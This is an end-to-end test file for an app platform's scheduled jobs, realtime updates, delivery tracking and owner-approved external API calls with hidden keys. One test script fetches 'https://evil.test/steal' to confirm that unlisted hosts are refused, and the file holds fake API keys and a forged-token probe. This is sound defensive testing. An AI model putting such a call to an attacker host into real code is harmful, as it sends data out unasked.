// Scheduled jobs, realtime and external APIs, end to end:
//   - an agent adds a job, tries it on preview, the owner publishes, and the
//     job then runs on live by itself and shows on the owner's app page;
//   - the job's realtime message updates an open page at once;
//   - a courier's phone moves the marker on a customer's map (the
//     delivery-tracking example), with a token only the customer's page has;
//   - http.fetch works only after the owner allows the host and enters the
//     API key on the Connections page; the key reaches the API but never the
//     script, the page or the log.
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { test, expect } from '@playwright/test';
import { appURL } from '../env.mjs';
import { person, signUp, email, unique, connectAgent, builder, confirmPublish, upgrade, fake, waitEmail } from '../lib.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const API_HOST = 'api.courier.test';
const API_KEY = 'sk_e2e_courier_key_9876';

// A small app that uses all three features.
const opsApp = () => ({
  tables: [
    { name: 'ticks', label: 'Job runs', columns: [{ name: 'job', type: 'text' }, { name: 'at', type: 'text' }] },
    { name: 'quotes', columns: [{ name: 'emirate', type: 'text' }, { name: 'price', type: 'real' }] },
  ],
  templates: {
    board: `<!doctype html><html><head><title>Board</title></head><body><h1>Job runs: <span id="n">{{.n}}</span></h1><p id="live">waiting</p>
<script>var es=new EventSource('/_rx/live/public:ticks');es.onmessage=function(e){var m=JSON.parse(e.data);
document.getElementById('n').textContent=m.n;document.getElementById('live').textContent='live update'};</script></body></html>`,
  },
  scripts: {
    board: `function handle(req) { return {template: 'board', data: {n: db.query('SELECT COUNT(*) AS n FROM ticks')[0].n}} }`,
    tick: `function handle(req) {
  if (req.method !== 'JOB') throw new Error('not a job');
  db.exec('INSERT INTO ticks (job, at) VALUES (?, ?)', req.body.job, req.body.scheduled_at);
  const n = db.query('SELECT COUNT(*) AS n FROM ticks')[0].n;
  realtime.publish({channel: 'public:ticks', data: {n: n}});
  return {text: 'tick ' + n};
}`,
    quote: `function handle(req) {
  let r;
  try { r = http.fetch({url: 'https://${API_HOST}/rates?emirate=' + encodeURIComponent(req.query.emirate || 'Dubai'), secret: 'COURIER_KEY'}); }
  catch (e) { return {json: {error: String(e)}, status: 502}; }
  if (!r.ok) return {json: {error: 'courier answered ' + r.status}, status: 502};
  db.exec('INSERT INTO quotes (emirate, price) VALUES (?, ?)', r.json.emirate, r.json.price);
  return {json: {price: r.json.price, currency: r.json.currency, emirate: r.json.emirate}};
}`,
    echo: `function handle(req) { return {text: http.fetch({url: 'https://${API_HOST}/echo', secret: 'COURIER_KEY'}).body} }`,
    elsewhere: `function handle(req) { try { http.fetch({url: 'https://evil.test/steal'}); return {text: 'reached'} } catch (e) { return {text: String(e)} } }`,
  },
  routes: [
    { method: 'GET', path: '/', script: 'board' },
    { method: 'GET', path: '/quote', script: 'quote' },
    { method: 'GET', path: '/echo', script: 'echo' },
    { method: 'GET', path: '/elsewhere', script: 'elsewhere' },
  ],
  jobs: [{ name: 'tick', script: 'tick', every: '1m' }],
  hosts: [{ host: API_HOST, purpose: 'Gets delivery prices from the courier' }],
  secrets: [{ name: 'COURIER_KEY', host: API_HOST, header: 'Authorization', prefix: 'Bearer', help: 'Courier portal, API keys page' }],
});

let owner, agent, app, publishedAt;
const text = async (page, url) => { await page.goto(url); return page.locator('body').innerText(); };

test.beforeAll(async ({ browser }) => {
  owner = await person(browser);
  owner.email = email('owner');
  await signUp(owner.page, owner.email);
  await upgrade(owner.page, 'Pro'); // a second app, and jobs every minute (Free runs them every 5)
  agent = await builder((await connectAgent(owner.page)).access_token);
  app = unique('ops');
});

test('agent adds a job, a host and a key; the owner is told what to do; the job is tried on preview', async () => {
  await agent.call('create_app', { app });
  const bad = await agent.call('apply_change', { app, definition: { ...opsApp(), jobs: [{ name: 'tick', script: 'tick', every: '5s' }],
    secrets: [{ name: 'COURIER_KEY', host: 'other.test', header: 'Authorization' }] } });
  expect(bad.ok).toBeFalsy();
  expect(bad.problems.join('\n')).toMatch(/every must be a duration from 1m/);
  expect(bad.problems.join('\n')).toMatch(/host "other.test" must be listed in hosts/);

  const applied = await agent.call('apply_change', { app, definition: opsApp() });
  expect(applied.ok).toBe(true);
  expect(applied.owner_actions.join('\n')).toContain(`allow ${API_HOST} at`);
  expect(applied.owner_actions.join('\n')).toContain(`enter COURIER_KEY at`);
  expect(applied.owner_actions.join('\n')).toContain(`/apps/${app}/connections`);

  // Jobs never run on preview by themselves; the agent tries the app's jobs, each once.
  const { runs } = await agent.call('try_scheduled_jobs', { app });
  expect(runs).toHaveLength(1);
  const run = runs[0];
  expect(run.job).toBe('tick');
  expect(run.status).toBe(200);
  expect(run.body).toBe('tick 1');
  expect(run.logs.map((l) => l.message).join('\n')).toMatch(/job tick -> ok/);
  // It takes only the app: no job name or stage chooses what runs, and jobs never run on live by hand.
  await expect(agent.call('try_scheduled_jobs', { app, job: 'tick' })).rejects.toThrow();
  await expect(agent.call('try_scheduled_jobs', { app, stage: 'live' })).rejects.toThrow();

  // Before the owner allows the host, the script is told why it cannot call out.
  const quote = await agent.call('view_page', { app, path: '/quote' });
  expect(quote.status).toBe(503); // the script answers 502; 502 and 504 are served as 503 so Cloudflare shows the page
  expect(quote.body).toContain(`the owner has not allowed ${API_HOST} yet`);

  const pub = await agent.call('publish', { app });
  await confirmPublish(owner.page, pub.confirm_url);
  publishedAt = Date.now();
  await owner.page.goto(`/apps/${app}/status`);
  await expect(owner.page.locator('body')).toContainText('Scheduled jobs');
  await expect(owner.page.locator('body')).toContainText('every 1m0s');
  await expect(owner.page.locator('body')).toContainText('not yet');
});

test('external API: only after the owner allows the host and enters the key; the key stays hidden', async ({ browser }) => {
  const { page } = owner;
  const visitor = await person(browser);
  const live = appURL(app);
  expect(await text(visitor.page, live + '/quote')).toContain(`the owner has not allowed ${API_HOST} yet`);

  // The Connections page explains the request; another owner cannot open it.
  await page.goto(`/apps/${app}`);
  await page.getByRole('link', { name: /Connections/ }).click();
  await expect(page.locator('body')).toContainText(API_HOST);
  await expect(page.locator('body')).toContainText('Gets delivery prices from the courier');
  await expect(page.locator('body')).toContainText('Courier portal, API keys page');
  const stranger = await person(browser);
  await signUp(stranger.page, email('stranger'));
  expect((await stranger.page.goto(`/apps/${app}/connections`)).status()).toBe(404);

  await page.getByRole('button', { name: 'Allow' }).click();
  await expect(page.locator('body')).toContainText(`allowed by ${owner.email}`);
  expect(await text(visitor.page, live + '/quote')).toContain('the owner has not entered COURIER_KEY yet');

  await page.goto(`/apps/${app}/connections`);
  await page.fill('#v-COURIER_KEY', API_KEY);
  await page.getByRole('button', { name: 'Save' }).click();
  await expect(page.locator('body')).toContainText('saved');
  await expect(page.locator('body')).toContainText('ends in 9876');
  expect(await page.content()).not.toContain(API_KEY);

  // The call now works, and the API got the key from Renoxium, not from the script.
  const before = (await fake.apiCalls(API_HOST)).length;
  expect(JSON.parse(await text(visitor.page, live + '/quote?emirate=Sharjah'))).toEqual({ price: 25, currency: 'AED', emirate: 'Sharjah' });
  const calls = await fake.apiCalls(API_HOST);
  expect(calls.length).toBe(before + 1);
  expect(calls.at(-1)).toMatchObject({ path: '/rates', method: 'GET', authorization: 'Bearer ' + API_KEY, query: { emirate: 'Sharjah' } });

  // Preview holds a copy of live data and the agent changes it unasked, so it
  // makes real calls only while the owner has turned test calls on.
  const tryPreview = async () => (await agent.call('view_page', { app, path: '/quote?emirate=Ajman' })).body;
  expect(await tryPreview()).toContain('until the owner turns on test calls');
  expect((await fake.apiCalls(API_HOST)).length).toBe(before + 1);
  await page.goto(`/apps/${app}/connections`);
  await page.getByRole('button', { name: 'Turn on for 2 hours' }).click();
  await expect(page.locator('body')).toContainText('On until');
  expect(JSON.parse(await tryPreview())).toMatchObject({ price: 25, emirate: 'Ajman' });
  await page.getByRole('button', { name: 'Turn off now' }).click();
  expect(await tryPreview()).toContain('until the owner turns on test calls');

  // An API that repeats the key does not hand it to the script, and the log has no key.
  const echoed = await text(visitor.page, live + '/echo');
  expect(echoed).toContain('you sent: Bearer [secret]');
  expect(echoed).not.toContain(API_KEY);
  const logs = JSON.stringify(await agent.call('get_logs', { app }));
  expect(logs).toContain(`fetch GET https://${API_HOST}/rates -> 200`);
  expect(logs).not.toContain(API_KEY);
  expect(JSON.stringify(await agent.call('get_app', { app }))).not.toContain(API_KEY);

  // Hosts the app does not list are refused whatever the script says.
  expect(await text(visitor.page, live + '/elsewhere')).toContain("evil.test is not in the app's hosts");

  // The saved quote is in the admin panel, and the account's meter counts the calls.
  await page.goto(`/apps/${app}/t/quotes`);
  await expect(page.locator('body')).toContainText('Sharjah');
  await page.goto('/billing');
  await expect(page.locator('body')).toContainText(/External API calls this month\s*[1-9]\d* of 20,000/);

  // Stop: calls are refused again at once.
  await page.goto(`/apps/${app}/connections`);
  await page.getByRole('button', { name: 'Stop' }).click();
  await expect(page.getByRole('button', { name: 'Allow' })).toBeVisible();
  expect(await text(visitor.page, live + '/quote')).toContain(`the owner has not allowed ${API_HOST} yet`);
  await visitor.ctx.close();
  await stranger.ctx.close();
});

test('realtime: a courier moves the marker on the customer\'s map, and only the customer\'s page may listen', async ({ browser }) => {
  const tracking = unique('deliv');
  const def = JSON.parse(fs.readFileSync(path.join(here, '..', '..', 'examples', 'delivery-tracking.json'), 'utf8'));
  await agent.call('create_app', { app: tracking });
  expect((await agent.call('apply_change', { app: tracking, definition: def })).ok).toBe(true);
  await confirmPublish(owner.page, (await agent.call('publish', { app: tracking })).confirm_url);
  const live = appURL(tracking);

  // The map library is replaced by a small stand-in, so the test needs no internet.
  // The stand-in keeps the courier marker the page puts on the map in window.marker.
  const offlineMap = async (ctx) => {
    await ctx.route(/unpkg\.com\/leaflet.*\.js/, (r) => r.fulfill({ contentType: 'text/javascript', body:
      `window.L={map:function(){return{setView:function(){return this},panTo:function(){},attributionControl:{setPrefix:function(){return this}}}},
       tileLayer:function(){return{addTo:function(){}}},divIcon:function(o){return o},
       marker:function(p){var pos=p;return window.marker={addTo:function(){return this},setLatLng:function(q){pos=q;return this},getLatLng:function(){return{lat:pos[0],lng:pos[1]}}}}};` }));
    await ctx.route(/unpkg\.com\/leaflet.*\.css|tile\.openstreetmap\.org/, (r) => r.fulfill({ status: 200, body: '' }));
  };
  const customer = await person(browser);
  await offlineMap(customer.ctx);
  const courier = await person(browser, { geolocation: { latitude: 25.2048, longitude: 55.2708 }, permissions: ['geolocation'] });

  // The customer finds the delivery with the order number and code.
  await customer.page.goto(live + '/');
  await customer.page.fill('#id', '1');
  await customer.page.fill('#code', 'abc123');
  await customer.page.getByRole('button', { name: 'Track delivery' }).click();
  await expect(customer.page).toHaveURL(/\/track\/1\?code=ABC123/);
  await expect(customer.page.locator('#status')).toHaveText('On the way');
  expect((await customer.page.goto(live + '/track/1?code=WRONG')).status()).toBe(404);
  await customer.page.goto(live + '/track/1?code=ABC123');

  // The live channel is private: no token, or the token of another channel, gets nothing.
  const stranger = await person(browser);
  expect((await stranger.page.goto(live + '/_rx/live/delivery-1')).status()).toBe(403);
  expect((await stranger.page.goto(live + '/_rx/live/delivery-1?token=zz.forged')).status()).toBe(403);
  expect((await stranger.page.goto(live + '/courier/1?key=wrong')).status()).toBe(404);

  // The courier shares their location; the customer's marker follows without a reload.
  await courier.page.goto(live + '/courier/1?key=courier-demo-key-change-me');
  await courier.page.getByRole('button', { name: 'Start sharing my location' }).click();
  await expect(courier.page.locator('#info')).toContainText('Sharing: sent');
  await courier.ctx.setGeolocation({ latitude: 25.2100, longitude: 55.2800 });
  await expect.poll(() => customer.page.evaluate(() => window.marker.getLatLng().lat), { timeout: 20_000 }).toBeCloseTo(25.21, 3);
  await expect(customer.page.locator('#seen')).toContainText('Live, updated');

  // Delivered: the customer sees it at once and the owner is emailed.
  const t = Date.now();
  await courier.page.getByRole('button', { name: 'Mark as delivered' }).click();
  await expect(customer.page.locator('#status')).toHaveText('Delivered');
  await waitEmail(owner.email, /Delivery #1 delivered to Mariam/, { after: t });
  // The position is saved, so the owner sees it in the admin panel.
  await owner.page.goto(`/apps/${tracking}/t/deliveries/1`);
  await expect(owner.page.locator('#f-lat')).toHaveValue('25.21');
  for (const p of [customer, courier, stranger]) await p.ctx.close();
});

test('the job runs on live by itself, updates an open page in real time and shows on the app page', async ({ browser }) => {
  test.setTimeout(150_000);
  const visitor = await person(browser);
  await visitor.page.goto(appURL(app) + '/');
  const seen = Number(await visitor.page.locator('#n').innerText());

  // A job published a minute ago runs within about a minute of its first check.
  await expect(visitor.page.locator('#live')).toHaveText('live update', { timeout: 100_000 });
  expect(Number(await visitor.page.locator('#n').innerText())).toBeGreaterThan(seen);
  expect(Date.now() - publishedAt).toBeGreaterThan(55_000); // not before its interval

  await owner.page.goto(`/apps/${app}/status`);
  const row = owner.page.locator('tr', { hasText: 'tick' }).filter({ hasText: 'every 1m0s' });
  await expect(row).toContainText('ok');
  await owner.page.goto(`/apps/${app}/t/ticks`);
  await expect(owner.page.locator('body')).toContainText('tick');
  const logs = await agent.call('get_logs', { app });
  expect(JSON.stringify(logs)).toMatch(/job tick -> ok in [^"]*: tick \d+/);
  await visitor.ctx.close();
});
